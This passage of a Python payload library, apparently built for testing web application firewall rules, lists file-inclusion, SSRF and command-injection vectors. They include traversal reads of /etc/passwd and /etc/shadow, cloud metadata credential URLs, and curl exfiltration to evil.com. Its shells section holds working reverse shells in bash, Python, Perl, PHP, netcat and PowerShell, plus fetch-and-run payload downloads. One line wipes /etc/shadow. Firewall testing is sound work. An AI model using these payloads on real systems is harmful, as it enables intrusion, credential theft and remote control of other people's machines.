        "php://filter/convert.quoted-printable-encode/resource=../../../etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-16le/resource=../../../etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-16be/resource=../../../etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-7/resource=../../../etc/passwd",
        "phar://test.phar/test.txt",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
    ]
    
    # Java-specific LFI
    JAVA = [
        "WEB-INF/web.xml",
        "../WEB-INF/web.xml",
        "../../WEB-INF/web.xml",
        "../../../WEB-INF/web.xml",
        "../../../../WEB-INF/web.xml",
        "../../../../../WEB-INF/web.xml",
        "../../../../../../WEB-INF/web.xml",
        "../../../../../../../WEB-INF/web.xml",
        "../../../../../../../../WEB-INF/web.xml",
        "../../../../../../../../../WEB-INF/web.xml",
        "/WEB-INF/web.xml",
        "WEB-INF/classes/",
        "../WEB-INF/classes/",
        "../../WEB-INF/classes/",
        "../../../WEB-INF/classes/",
        "WEB-INF/classes/META-INF/",
        "WEB-INF/classes/com/",
        "WEB-INF/classes/org/",
        "WEB-INF/classes/net/",
        "/META-INF/context.xml",
        "../META-INF/context.xml",
        "../../META-INF/context.xml",
        "../../../META-INF/context.xml",
        "META-INF/MANIFEST.MF",
        "../META-INF/MANIFEST.MF",
        "../../META-INF/MANIFEST.MF",
        "../../../META-INF/MANIFEST.MF",
        "../../../../META-INF/MANIFEST.MF"
    ]
    
    # ASP/ASP.NET specific LFI
    ASP = [
        "../web.config",
        "../../web.config",
        "../../../web.config",
        "../../../../web.config",
        "../../../../../web.config",
        "../../../../../../web.config",
        "../../../../../../../web.config",
        "../../../../../../../../web.config",
        "/web.config",
        "../Global.asax",
        "../../Global.asax",
        "../../../Global.asax",
        "../../../../Global.asax",
        "../App_Code/",
        "../../App_Code/",
        "../../../App_Code/",
        "../../../../App_Code/",
        "../App_Data/",
        "../../App_Data/",
        "../../../App_Data/",
        "../../../../App_Data/",
        "../App_GlobalResources/",
        "../../App_GlobalResources/",
        "../../../App_GlobalResources/",
        "../../../../App_GlobalResources/",
        "../bin/",
        "../../bin/",
        "../../../bin/",
        "../../../../bin/"
    ]
    
    # Protocol handler exploits
    PROTOCOL_HANDLERS = [
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
        "file://localhost/c:/windows/win.ini",
        "file:///c:/windows/win.ini",
        "file://127.0.0.1/etc/passwd",
        "file:///var/www/html/index.php",
        "jar:file:///etc/passwd!/",
        "jar:http://localhost:8080/file.jar!/",
        "zip://shell.jpg%23payload.php",
        "phar://shell.jpg/payload.php",
        "glob:///../../../etc/passwd",
        "expect://id",
        "input://",
        "fd://1",
        "gopher://localhost:80/_GET%20/%20HTTP/1.0%0A",
        "tftp://localhost:80/a"
    ]
    
    # Advanced Path traversal techniques
    ADVANCED = [
        # Complex path normalization
        "/var/www/../../etc/passwd",
        "///var/www/../../etc/passwd",
        "/./var/www/../../etc/passwd",
        "/var/www/./../../etc/passwd",
        "/var/www/../../../etc/passwd",
        "/%2e%2e/%2e%2e/etc/passwd",
        "/%2e/%2e%2e/%2e%2e/etc/passwd",
        "/..;/..;/etc/passwd",
        "/../.;/../.;/etc/passwd",
        
        # Nested traversal
        "/var/www/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/var/www/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/var/www/%c0%ae%c0%ae/etc/passwd",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/var/www/images/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        
        # Unusual path components
        "....//....//....//etc//passwd",
        "....////....////....////etc////passwd",
        "....//../....//../....//../etc//passwd",
        "../.../.../.../.../etc/passwd",
        "..//...//...//...//etc//passwd",
        "..../\\.../\\.../etc/passwd",
        "\\../\\../\\../etc/passwd",
        
        # Specific application bypasses (generic examples)
        "/var/www/html/index.php?page=php://filter/convert.base64-encode/resource=../wp-config.php",
        "/index.php/..%252f..%252f..%252fetc/passwd",
        "/app/main.php?file=../../../etc/passwd%00",
        "/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%0Aetc/passwd"
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all LFI vectors."""
        return (
            cls.BASIC +
            cls.ENCODING +
            cls.PHP_WRAPPERS +
            cls.JAVA +
            cls.ASP +
            cls.PROTOCOL_HANDLERS +
            cls.ADVANCED
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic LFI vectors."""
        return cls.BASIC
    
    @classmethod
    def advanced(cls) -> list:
        """Return advanced LFI vectors."""
        return cls.ENCODING + cls.ADVANCED + cls.PROTOCOL_HANDLERS
    
    @classmethod
    def platform_specific(cls, platform: str) -> list:
        """Return LFI vectors specific to a platform."""
        platform = platform.lower()
        if platform == "php":
            return cls.PHP_WRAPPERS
        elif platform == "java":
            return cls.JAVA
        elif platform == "asp" or platform == "aspx" or platform == "asp.net":
            return cls.ASP
        return []


class RFIVectors:
    """Remote File Inclusion attack vectors for testing WAF rules."""
    
    # Basic RFI vectors
    BASIC = [
        "http://evil.com/shell.php",
        "https://evil.com/shell.php",
        "http://evil.com/shell.php?cmd=whoami",
        "http://evil.com/shell.php?cmd=id",
        "http://evil.com/shell.php?cmd=cat+/etc/passwd",
        "http://127.0.0.1/shell.php",
        "http://localhost/shell.php",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://192.168.0.1/shell.php",
        "http://10.0.0.1/shell.php",
        "http://172.16.0.1/shell.php",
        "ftp://evil.com/shell.php",
        "https://raw.githubusercontent.com/tennc/webshell/master/php/webshell.php",
        "https://pastebin.com/raw/abcdefgh",  # Generic pastebin example
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt"
    ]
    
    # URL encoding, double encoding and obfuscation
    ENCODED = [
        # URL encoding
        "http%3A%2F%2Fevil.com%2Fshell.php",
        "https%3A%2F%2Fevil.com%2Fshell.php",
        "%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%73%68%65%6c%6c%2e%70%68%70",  # Full encoding
        
        # Double encoding
        "http%253A%252F%252Fevil.com%252Fshell.php",
        "%2568%2574%2574%2570%253a%252f%252f%2565%2576%2569%256c%252e%2563%256f%256d%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570",
        
        # Mixed encoding
        "http://%65%76%69%6c.com/shell.php",
        "http://evil.com/%73%68%65%6c%6c.php",
        "http://evil.com/shell.%70%68%70",
        
        # Unicode/UTF-8 encoding
        "http://xn--80ak6aa92e.com/shell.php",  # Punycode
        "http://evil.com/shell.php?%u0063%u006d%u0064=%u0069%u0064",  # Unicode encoding
        
        # Alternate representations
        "http://0x65.0x76.0x69.0x6c.0x2e.0x63.0x6f.0x6d/shell.php",  # Hex IP
        "http://1113982867/shell.php",  # Decimal IP
        "http://0101.0166.0151.0154.02.0143.0157.0155/shell.php",  # Octal IP
        
        # Case variation
        "HtTp://eViL.cOm/ShElL.pHp",
        "hTtPs://eViL.CoM/sHeLl.PhP",
        
        # Domain obfuscation
        "http://evil%252ecom/shell.php",
        "http://evil.com@malicious.com/shell.php",
        "http://evil.com%00@malicious.com/shell.php",
        "http://evil.com#@malicious.com/shell.php"
    ]
    
    # Protocol handler variations
    PROTOCOL = [
        "//evil.com/shell.php",  # Protocol relative URL
        "////evil.com/shell.php",
        "\\/\\/evil.com/shell.php",
        "\\\\evil.com\\shell.php",
        "/\\evil.com/shell.php",
        "http:evil.com/shell.php",
        "http:/evil.com/shell.php",
        "http:///evil.com/shell.php",
        "ftp://evil.com/shell.php",
        "ftps://evil.com/shell.php",
        "sftp://evil.com/shell.php",
        "tftp://evil.com/shell.php",
        "gopher://evil.com/shell.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
        "jar:http://evil.com/shell.jar!/",
        "jar:https://evil.com/shell.jar!/",
        "zip://shell.jpg%23payload.php",
        "ssh://evil.com/shell.php",
        "smtp://evil.com/shell.php",
        "mailto:user@evil.com",
        "news:alt.evil.com",
        "ldap://evil.com/shell.php",
        "scp://evil.com/shell.php",
        "dict://evil.com/shell.php"
    ]
    
    # SSRF-specific RFI
    SSRF = [
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:3306/",
        "http://localhost/",
        "http://[::1]/",  # IPv6 localhost
        "http://[0:0:0:0:0:0:0:1]/",  # Full IPv6 localhost
        "http://0.0.0.0/",
        "http://127.127.127.127/",
        "http://127.0.1.3/",
        "http://127.0.0.0/",
        "http://2130706433/",  # decimal representation of 127.0.0.1
        "http://0177.0000.0000.0001/",  # octal representation
        "http://0x7f.0x0.0x0.0x1/",  # hex representation
        "http://127.1/",
        "http://127.0.0.1.nip.io/",
        "http://169.254.169.254/",  # AWS metadata service
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://metadata.google.internal/",  # GCP metadata service
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/v1/",  # Azure metadata service
        "http://metadata.azure.internal/metadata/instance",
        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        "http://192.168.0.1/",  # Common private IPv4
        "http://10.0.0.0/8",
        "http://172.16.0.0/12",
        "http://192.168.0.0/16",
        "http://localhost:9200/",  # ElasticSearch
        "http://localhost:6379/",  # Redis
        "http://localhost:2375/",  # Docker API
        "http://localhost:8080/",  # Common development port
        "http://localhost:3000/",  # Common development port
        "http://localhost:8000/",  # Common development port
        "http://localhost:8443/",  # Common HTTPS development port
        "http://localhost:8888/",  # Common development port
        "http://user:pass@localhost/",  # With basic auth
        "file:///etc/passwd",  # Local file access via file protocol
        "dict://localhost:11211/stats",  # Memcached
        "gopher://localhost:11211/_%0d%0astat",  # Memcached via gopher
        "redis://localhost:6379/info",  # Redis
        "ldap://localhost:389/",  # LDAP
        "tftp://localhost:69/smallfile",  # TFTP
        "ftp://localhost:21/",  # FTP
        "telnet://localhost:23/"  # Telnet
    ]
    
    # RFI with data exfiltration
    EXFILTRATION = [
        "http://evil.com/shell.php?data=",  # Parameter-based exfiltration
        "http://evil.com/shell.php#",  # Fragment-based exfiltration
        "http://evil.com/shell.php?callback=",  # JSONP-based exfiltration
        "http://evil.com/steal.php?cookie=",  # Cookie theft
        "http://evil.com/log.php?data=document.cookie",  # Specific cookie theft
        "http://evil.com/log.php?data=localStorage",  # LocalStorage theft
        "http://evil.com/log.php?data=sessionStorage",  # SessionStorage theft
        "http://evil.com/beacon.php?ip=",  # IP logging
        "http://evil.com/capture.php?screen=",  # Screen capture (conceptual)
        "http://evil.com/mic.php?audio=",  # Audio capture (conceptual)
        "http://evil.com/exfil.php?clipboard=",  # Clipboard data (conceptual)
        "http://evil.com/keylog.php?keys=",  # Keylogging (conceptual)
        "http://evil.com/steal.php?token=",  # Token theft
        "http://evil.com/location.php?coords=",  # Geolocation data
        "http://evil.com/net.php?lan=",  # Internal network information
        "http://evil.com/browser.php?data=",  # Browser info
        "http://evil.com/system.php?os=",  # OS info
        "http://evil.com/contacts.php?list="  # Contact list (conceptual)
    ]
    
    # Advanced RFI techniques
    ADVANCED = [
        # Request Smuggling / CRLF Injection
        "http://evil.com/shell.php\r\nX-Forwarded-For: 127.0.0.1",
        "http://evil.com/shell.php\r\nHost: internal-service",
        "http://evil.com/shell.php\r\nContent-Length: 0\r\n\r\nGET /internal-api HTTP/1.1\r\nHost: localhost",
        
        # DNS rebinding (conceptual examples)
        "http://dynamic-evil.com/shell.php",  # Domain that changes IP after DNS TTL
        "http://evil.com.127.0.0.1.nip.io/shell.php",  # Domain pointing to 127.0.0.1
        
        # URL parsers inconsistencies
        "http://evil.com#@internal-service/shell.php",
        "http://evil.com?@internal-service/shell.php",
        "http://internal-service@evil.com/shell.php",
        "http://internal-service%2540evil.com/shell.php",
        "http://evil.com%09@internal-service/shell.php",
        "http://evil.com%252f@internal-service/shell.php",
        
        # Protocol handler exploits
        "https://evil.com/\\\\\\\\internal-service/shell.php",
        "https://evil.com/internal-service\\\\..\\\\..\\\\..\\\\shell.php",
        
        # Content-Type bypass
        "http://evil.com/shell.jpg",  # Actually a PHP file with image headers
        "http://evil.com/shell.gif",  # Actually a PHP file with image headers
        "http://evil.com/shell.png",  # Actually a PHP file with image headers
        
        # Open redirect to internal services
        "http://public-service/redirect?url=http://internal-service/shell.php",
        "http://public-service/redirect?url=//internal-service/shell.php",
        "http://public-service/redirect?url=/\\\\internal-service/shell.php"
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all RFI vectors."""
        return (
            cls.BASIC +
            cls.ENCODED +
            cls.PROTOCOL +
            cls.SSRF +
            cls.EXFILTRATION +
            cls.ADVANCED
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic RFI vectors."""
        return cls.BASIC
    
    @classmethod
    def advanced(cls) -> list:
        """Return advanced RFI vectors."""
        return cls.ENCODED + cls.PROTOCOL + cls.ADVANCED
    
    @classmethod
    def ssrf(cls) -> list:
        """Return SSRF-specific RFI vectors."""
        return cls.SSRF
    
    @classmethod
    def exfiltration(cls) -> list:
        """Return RFI vectors designed for data exfiltration."""
        return cls.EXFILTRATION


class CommandInjectionVectors:
    """Command injection attack vectors for testing WAF rules."""
    
    # Basic command injection
    BASIC = [
        ";id",
        "& id",
        "&& id",
        "| id",
        "|| id",
        "$(id)",
        "`id`",
        ";ls -la",
        "& ls -la",
        "&& ls -la",
        "| ls -la",
        "|| ls -la",
        "$(ls -la)",
        "`ls -la`",
        ";whoami",
        "& whoami",
        "&& whoami",
        "| whoami",
        "|| whoami",
        "$(whoami)",
        "`whoami`",
        ";cat /etc/passwd",
        "& cat /etc/passwd",
        "&& cat /etc/passwd",
        "| cat /etc/passwd",
        "|| cat /etc/passwd",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        ";ping -c 4 127.0.0.1",
        "& ping -c 4 127.0.0.1",
        "&& ping -c 4 127.0.0.1",
        "| ping -c 4 127.0.0.1",
        "|| ping -c 4 127.0.0.1",
        "$(ping -c 4 127.0.0.1)",
        "`ping -c 4 127.0.0.1`",
        "& dir",
        "&& dir",
        "| dir",
        "|| dir",
        "$(dir)",
        "`dir`"
    ]
    
    # Windows-specific command injection
    WINDOWS = [
        ";dir",
        "& dir",
        "&& dir",
        "| dir",
        "|| dir",
        "& type C:\\Windows\\win.ini",
        "&& type C:\\Windows\\win.ini",
        "| type C:\\Windows\\win.ini",
        "|| type C:\\Windows\\win.ini",
        "& net user",
        "&& net user",
        "| net user",
        "|| net user",
        "& ipconfig /all",
        "&& ipconfig /all",
        "| ipconfig /all",
        "|| ipconfig /all",
        "& whoami",
        "&& whoami",
        "| whoami",
        "|| whoami",
        ";cmd /c net user",
        "& cmd /c net user",
        "&& cmd /c net user",
        "| cmd /c net user",
        "|| cmd /c net user",
        "; powershell.exe -Command Get-Process",
        "& powershell.exe -Command Get-Process",
        "&& powershell.exe -Command Get-Process",
        "| powershell.exe -Command Get-Process",
        "|| powershell.exe -Command Get-Process",
        "%0acmd /c dir",
        "%0acmd /c net user",
        "%0acmd /c whoami",
        "|%0acmd /c dir",
        ";%0acmd /c dir",
        "||%0acmd /c dir",
        "&&%0acmd /c dir"
    ]
    
    # Linux/Unix-specific command injection
    LINUX = [
        ";uname -a",
        "& uname -a",
        "&& uname -a",
        "| uname -a",
        "|| uname -a",
        "$(uname -a)",
        "`uname -a`",
        ";cat /etc/shadow",
        "& cat /etc/shadow",
        "&& cat /etc/shadow",
        "| cat /etc/shadow",
        "|| cat /etc/shadow",
        "$(cat /etc/shadow)",
        "`cat /etc/shadow`",
        ";ps aux",
        "& ps aux",
        "&& ps aux",
        "| ps aux",
        "|| ps aux",
        "$(ps aux)",
        "`ps aux`",
        ";find / -perm -4000 -type f 2>/dev/null",
        "& find / -perm -4000 -type f 2>/dev/null",
        "&& find / -perm -4000 -type f 2>/dev/null",
        "| find / -perm -4000 -type f 2>/dev/null",
        "|| find / -perm -4000 -type f 2>/dev/null",
        "$(find / -perm -4000 -type f 2>/dev/null)",
        "`find / -perm -4000 -type f 2>/dev/null`",
        ";netstat -tuln",
        "& netstat -tuln",
        "&& netstat -tuln",
        "| netstat -tuln",
        "|| netstat -tuln",
        "$(netstat -tuln)",
        "`netstat -tuln`"
    ]
    
    # Filter evasion techniques
    FILTER_EVASION = [
        # Space variations
        ";&id",
        ";&nbsp;id",
        ";&bsol;id",
        ";$IFS$9id",  # Internal Field Separator
        ";%09id",     # Horizontal tab
        ";%0Aid",     # Line feed
        ";%0Did",     # Carriage return
        ";${IFS}id",
        
        # Character substitution
        ";/???/??t /???/p?ss?d",  # /bin/cat /etc/passwd with wildcards
        ";/\bin/cat${IFS}/etc/passwd",
        ";c\\at /et\\c/pa\\sswd",
        ";ca''t /etc/pa''sswd",
        
        # Command chaining/redirection evasion
        ";id%0A",
        "id|id",
        ";id%0A|id",
        ";`id`",
        ";$(id)",
        ";id;",
        ";id|",
        ";id||id",
        ";id&&id",
        ";id&id",
        ";id^id",
        
        # Encoded
        "%3Bid",
        "%7C%20id",
        "%26%20id",
        "%26%26%20id",
        "%7C%7C%20id",
        
        # Double encoded
        "%253Bid",
        "%257C%2520id",
        "%2526%2520id",
        "%2526%2526%2520id",
        "%257C%257C%2520id",
        
        # Comment injection
        ";id#",
        ";id -- ",
        ";id/**/",
        ";/**/id",
        
        # String concatenation
        ";ca'+'t /etc/passwd",
        ";ca\"t /etc/passwd",
        ";ca`t` /etc/passwd",
        
        # Null byte injection
        ";id%00",
        
        # Unicode/UTF-8
        ";%E2%80%A8id",  # Line separator
        ";%E2%80%A9id",  # Paragraph separator
        
        # Base64 encoding
        ";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash",  # Reverse shell
        
        # Special characters
        ";id\n",
        ";id\r",
        ";id\t",
        ";id\v",
        ";id\f",
        ";id\b",
        ";id\a",
        ";id\e",
        
        # Logical operators
        ";true&&id",
        ";false||id",
        
        # Time-based blind command injection
        ";sleep 5",
        "& sleep 5",
        "&& sleep 5",
        "| sleep 5",
        "|| sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        
        # Hex encoding
        ";$(echo -e \"\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
        
        # Nested commands
        ";eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
        ";bash<<<$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)",
        
        # PATH manipulation
        ";PATH=$PATH:/tmp id",
        
        # Variable manipulation
        ";x=cat;y=/etc/passwd;$x $y",
        ";X=cat;$X /etc/passwd",
        
        # Long string obfuscation
        ";cat /e?c/p?s?wd",
        ";cat /e??/??ss??",
        ";cat /???/??????",
        
        # Data exfiltration
        ";cat /etc/passwd | curl -d @- https://evil.com",
        ";cat /etc/passwd | base64 | curl -d @- https://evil.com"
    ]
    
    # Advanced command injection with environment manipulation
    ADVANCED = [
        # Environment variables
        ";env",
        "& env",
        "&& env",
        "| env",
        "|| env",
        "$(env)",
        "`env`",
        ";set",
        "& set",
        "&& set",
        "| set",
        "|| set",
        "$(set)",
        "`set`",
        ";printenv",
        "& printenv",
        "&& printenv",
        "| printenv",
        "|| printenv",
        "$(printenv)",
        "`printenv`",
        
        # Command substitution
        "$(ls -la)",
        "`ls -la`",
        "$((10+5))",
        "$(($(date +%s)))",
        "$(eval ls -la)",
        "$(bash -c 'ls -la')",
        "$(($(date +%s)-1577836800))",
        
        # I/O redirection
        ";ls -la > /tmp/output.txt",
        "& ls -la > /tmp/output.txt",
        "&& ls -la > /tmp/output.txt",
        "| ls -la > /tmp/output.txt",
        "|| ls -la > /tmp/output.txt",
        ";cat /etc/passwd > /tmp/passwd.txt",
        ";cat /dev/null > /etc/shadow",
        ";cat /etc/passwd | grep root",
        ";cat /etc/passwd | awk -F: '{print $1}'",
        ";cat /etc/passwd | cut -d: -f1",
        ";cat /etc/passwd | sed 's/root/admin/g'",
        ";cat /etc/passwd | head -n 5",
        ";cat /etc/passwd | tail -n 5",
        
        # Process creation and backgrounding
        ";nohup ls -la &",
        ";ls -la & ps aux",
        ";(ls -la &)",
        ";{ ls -la; id; }",
        ";ls -la & id",
        ";ls -la & id &",
        ";bash -c 'ls -la'",
        ";exec ls -la",
        
        # Script creation
        ";echo '#!/bin/bash\nid' > /tmp/cmd.sh; chmod +x /tmp/cmd.sh; /tmp/cmd.sh",
        ";echo 'id' | bash",
        ";bash -c 'echo \"id\" > /tmp/cmd.sh; chmod +x /tmp/cmd.sh; /tmp/cmd.sh'",
        
        # Line concatenation
        ";ls\n-la",
        ";cat\\\n/etc/passwd",
        
        # Signal manipulation
        ";trap 'ls -la' SIGINT; kill -SIGINT $$",
        ";trap 'id' SIGTERM; kill -SIGTERM $$",
        
        # Shell code execution
        ";python -c 'import os; os.system(\"id\")'",
        ";python3 -c 'import os; os.system(\"id\")'",
        ";perl -e 'system(\"id\")'",
        ";ruby -e 'system(\"id\")'",
        ";php -r 'system(\"id\");'",
        ";lua -e 'os.execute(\"id\")'",
        ";node -e 'require(\"child_process\").exec(\"id\", (error, stdout, stderr) => { console.log(stdout); })'",
        
        # Time delay
        ";sleep 10",
        ";ping -c 10 127.0.0.1",
        ";while true; do echo 'Infinite loop'; sleep 1; done",
        ";for i in {1..10}; do echo $i; sleep 1; done",
        ";timeout 10 yes",
        
        # File operations
        ";find / -name \"*.conf\" -type f 2>/dev/null",
        ";find / -perm -u=s -type f 2>/dev/null",
        ";find / -perm -4000 -type f 2>/dev/null",
        ";ls -la /etc/",
        ";ls -la /var/www/",
        ";ls -la /home/",
        ";ls -la /root/",
        ";ls -la /tmp/",
        ";ls -la /var/log/",
        
        # Network operations
        ";nc -lvp 4444",
        ";nc -e /bin/bash 10.0.0.1 4444",
        ";curl http://10.0.0.1/shell.sh | bash",
        ";wget -O- http://10.0.0.1/shell.sh | bash",
        ";telnet 10.0.0.1 4444",
        ";ssh user@10.0.0.1",
        ";socat TCP4:10.0.0.1:4444 EXEC:/bin/bash",
        
        # System information gathering
        ";uname -a",
        ";id",
        ";whoami",
        ";hostname",
        ";ifconfig",
        ";ip addr",
        ";netstat -tuln",
        ";ps aux",
        ";df -h",
        ";free -m",
        ";ss -lntu"
    ]
    
    # Web shells and reverse shells
    SHELLS = [
        # PHP web shells
        ";echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
        ";echo '<?php echo shell_exec($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
        ";echo '<?php echo passthru($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
        ";echo '<?php echo exec($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
        ";echo '<?php $sock=fsockopen(\"10.0.0.1\",4444);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' > /var/www/html/shell.php",
        
        # Bash reverse shells
        ";bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        ";0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196",
        ";/bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        
        # Python reverse shells
        ";python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        ";python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        
        # Perl reverse shells
        ";perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        
        # Ruby reverse shells
        ";ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        
        # Netcat reverse shells
        ";nc -e /bin/sh 10.0.0.1 4444",
        ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
        
        # Telnet reverse shells
        ";rm -f /tmp/p; mknod /tmp/p p && telnet 10.0.0.1 4444 0/tmp/p",
        
        # Socat reverse shells
        ";socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
        
        # PHP reverse shells
        ";php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        ";php -r '$sock=fsockopen(\"10.0.0.1\",4444);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        ";php -r '$sock=fsockopen(\"10.0.0.1\",4444);system(\"/bin/sh -i <&3 >&3 2>&3\");'",
        ";php -r '$sock=fsockopen(\"10.0.0.1\",4444);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
        
        # Powershell reverse shells (Windows)
        ";powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        ";powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
        
        # Payload download and execution
        ";curl -s https://evil.com/shell.sh | bash",
        ";wget -O- https://evil.com/shell.sh | bash",
        ";fetch -o- https://evil.com/shell.sh | bash",
        ";lwp-download https://evil.com/shell.sh /tmp/shell.sh && bash /tmp/shell.sh",
        ";curl -o /tmp/shell.sh https://evil.com/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
        ";wget -O /tmp/shell.sh https://evil.com/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh"
    ]
    
    @classmethod
    def all(cls) -> list:
        """Return all command injection vectors."""
        return (
            cls.BASIC +
            cls.WINDOWS +
            cls.LINUX +
            cls.FILTER_EVASION +
            cls.ADVANCED +
            cls.SHELLS
        )
    
    @classmethod
    def basic(cls) -> list:
        """Return basic command injection vectors."""
        return cls.BASIC
    
    @classmethod
    def windows(cls) -> list:
        """Return Windows-specific command injection vectors."""
        return cls.WINDOWS
    
    @classmethod
    def linux(cls) -> list:
        """Return Linux-specific command injection vectors."""
        return cls.LINUX
    
    @classmethod
    def advanced(cls) -> list:
        """Return advanced command injection vectors."""
        return cls.FILTER_EVASION + cls.ADVANCED
    
    @classmethod
    def shells(cls) -> list:
        """Return web shell and reverse shell command injection vectors."""
        return cls.SHELLS


class EC2MetadataVectors:
    """Attack vectors for AWS EC2 Metadata Service SSRF."""
    
    # Basic EC2 metadata service paths
    BASIC = [
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/instance-type",
        "http://169.254.169.254/latest/meta-data/local-hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-hostname",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/meta-data/placement/region",
        "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
        "http://169.254.169.254/latest/meta-data/security-groups",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document"
    ]
    
    # Sensitive data in EC2 metadata
    SENSITIVE = [
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
